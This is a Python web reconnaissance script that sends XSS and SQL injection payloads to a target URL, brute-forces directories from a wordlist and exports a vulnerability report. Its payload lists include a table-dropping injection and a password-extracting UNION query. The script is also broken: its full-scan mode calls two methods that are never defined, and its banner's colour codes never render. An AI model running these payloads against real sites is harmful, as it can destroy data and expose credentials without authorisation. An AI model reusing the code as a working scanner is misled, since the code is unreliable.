#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import sys
import requests
import dns.resolver
import ssl
import socket
from bs4 import BeautifulSoup
from colorama import Fore, Style, init
from argparse import ArgumentParser
import json
from urllib.parse import urljoin
from concurrent.futures import ThreadPoolExecutor
from tabulate import tabulate

init(autoreset=True)

BANNER = r"""
{Fore.RED} ______   {Fore.GREEN} _____     {Fore.BLUE} _____ 
{Fore.RED}|  ____| {Fore.GREEN}|  __ \    {Fore.BLUE}/ ____|
{Fore.RED}| |__    {Fore.GREEN}| |__) |   {Fore.BLUE}( (___  
{Fore.RED}|  __|   {Fore.GREEN}|  _  /     {Fore.BLUE}\___ \ 
{Fore.RED}| |____ {Fore.GREEN}| | \ \ _  {Fore.BLUE}____) |
{Fore.RED}|______|{Fore.GREEN}|_|  \_(_) {Fore.BLUE}|_____/ 
"""

# Enhanced payload lists
XSS_PAYLOADS = [
    "<script>alert('XSS')</script>",
    "javascript:alert('XSS')",
    "<img src=x onerror=alert('XSS')>",
    "'-alert('XSS')-'"
]

SQLI_PAYLOADS = [
    "' OR 1=1--",
    "'; DROP TABLE users--",
    "1' UNION SELECT null, password FROM users--",
    "admin'--"
]

class WebRecon:
    def __init__(self, target, proxy=None, timeout=10, threads=10):
        self.target = target
        self.proxy = proxy
        self.timeout = timeout
        self.threads = threads
        self.results = {
            'vulnerabilities': {
                'critical': [],
                'medium': [],
                'low': []
            },
            'directories': [],
            'internal_links': []
        }
        self.session = requests.Session()
        if proxy:
            self.session.proxies = {
                'http': proxy,
                'https': proxy
            }

    def scan_common_vulns(self):
        """Enhanced vulnerability scanning with payloads"""
        print(f"\n{Fore.CYAN}[+] Performing Advanced Vulnerability Scan...")
        
        # XSS Scanning
        print(f"\n{Fore.MAGENTA}--- XSS Testing ---")
        for payload in XSS_PAYLOADS:
            try:
                test_url = urljoin(self.target, 'test_path')
                response = self.session.get(test_url, params={'input': payload})
                if payload in response.text:
                    vuln = {
                        'type': 'XSS',
                        'severity': 'Critical',
                        'url': test_url,
                        'payload': payload
                    }
                    self.results['vulnerabilities']['critical'].append(vuln)
                    print(f"{Fore.RED}[CRITICAL] Possible XSS vulnerability found with payload: {payload}")
            except Exception as e:
                print(f"{Fore.RED}[-] XSS Test Error: {e}")

        # SQLi Scanning
        print(f"\n{Fore.MAGENTA}--- SQLi Testing ---")
        for payload in SQLI_PAYLOADS:
            try:
                test_url = urljoin(self.target, 'test_path')
                response = self.session.get(test_url, params={'id': payload})
                if "SQL syntax" in response.text or "mysql" in response.text.lower():
                    vuln = {
                        'type': 'SQLi',
                        'severity': 'Critical',
                        'url': test_url,
                        'payload': payload
                    }
                    self.results['vulnerabilities']['critical'].append(vuln)
                    print(f"{Fore.RED}[CRITICAL] Possible SQLi vulnerability found with payload: {payload}")
            except Exception as e:
                print(f"{Fore.RED}[-] SQLi Test Error: {e}")

    def directory_scan(self, wordlist):
        """Multithreaded directory/file scan"""
        print(f"\n{Fore.CYAN}[+] Starting Multithreaded Directory Scan...")
        try:
            with open(wordlist, 'r') as f:
                paths = [line.strip() for line in f if line.strip()]
            
            with ThreadPoolExecutor(max_workers=self.threads) as executor:
                futures = []
                for path in paths:
                    future = executor.submit(self.check_path, path)
                    futures.append(future)
                
                for future in futures:
                    result = future.result()
                    if result:
                        self.results['directories'].append(result)
                        print(f"{Fore.GREEN}[{result['status']}] {result['url']}")
        except FileNotFoundError:
            print(f"{Fore.RED}[-] Wordlist file not found: {wordlist}")

    def check_path(self, path):
        """Helper function for directory scanning"""
        url = urljoin(self.target, path)
        try:
            response = self.session.get(url, timeout=self.timeout)
            if response.status_code in [200, 301, 302, 403]:
                return {
                    'url': url,
                    'status': response.status_code,
                    'size': len(response.content)
                }
        except requests.exceptions.RequestException:
            return None

    def generate_report(self):
        """Generate detailed vulnerability report"""
        report = []
        for severity in ['critical', 'medium', 'low']:
            for vuln in self.results['vulnerabilities'][severity]:
                report.append([
                    vuln['type'],
                    severity.capitalize(),
                    vuln.get('url', 'N/A'),
                    vuln.get('payload', 'N/A')
                ])
        
        if report:
            print(f"\n{Fore.CYAN}[+] Vulnerability Report:")
            print(tabulate(report, headers=["Type", "Severity", "URL", "Payload"], tablefmt="grid"))
        else:
            print(f"{Fore.GREEN}[+] No critical vulnerabilities detected")

    def export_results(self, format='json'):
        """Enhanced export with vulnerability ratings"""
        filename = f"webrecon_{self.target.replace('://', '_')}.{format}"
        try:
            if format == 'json':
                with open(filename, 'w') as f:
                    json.dump(self.results, f, indent=4)
            elif format == 'txt':
                with open(filename, 'w') as f:
                    f.write("=== VULNERABILITY REPORT ===\n")
                    for severity in ['critical', 'medium', 'low']:
                        f.write(f"\n{severity.upper()}:\n")
                        for vuln in self.results['vulnerabilities'][severity]:
                            f.write(f"Type: {vuln['type']}\n")
                            f.write(f"URL: {vuln.get('url', 'N/A')}\n")
                            f.write(f"Payload: {vuln.get('payload', 'N/A')}\n")
                            f.write("\n")
            print(f"{Fore.GREEN}[+] Results exported to {filename}")
        except Exception as e:
            print(f"{Fore.RED}[-] Export failed: {e}")

def main():
    print(BANNER)
    parser = ArgumentParser(description="WebRecon - Advanced Web Reconnaissance Tool")
    parser.add_argument("-u", "--url", required=True, help="Target URL (e.g., https://example.com)")
    parser.add_argument("--vuln-scan", action="store_true", help="Perform advanced vulnerability scan")
    parser.add_argument("--dir-scan", metavar="WORDLIST", help="Perform directory scan using wordlist")
    parser.add_argument("--threads", type=int, default=10, help="Number of threads for directory scan")
    parser.add_argument("--proxy", help="Use proxy (e.g., http://127.0.0.1:8080)")
    parser.add_argument("--output", choices=['json', 'txt'], help="Export results to file")
    parser.add_argument("--full", action="store_true", help="Run Full Scan")

    args = parser.parse_args()

    target = args.url
    if not target.startswith(('http://', 'https://')):
        target = 'http://' + target

    scanner = WebRecon(target, proxy=args.proxy, threads=args.threads)

    try:
        if args.full:
            scanner.check_http_headers()
            scanner.scan_common_vulns()
            if args.dir_scan:
                scanner.directory_scan(args.dir_scan)
            scanner.analyze_internal_links()
            scanner.generate_report()
        else:
            if args.vuln_scan:
                scanner.scan_common_vulns()
                scanner.generate_report()
            if args.dir_scan:
                scanner.directory_scan(args.dir_scan)
        
        if args.output:
            scanner.export_results(args.output)

    except KeyboardInterrupt:
        print(f"\n{Fore.RED}[-] Scan interrupted by user")
        sys.exit(1)

if __name__ == "__main__":
    main()
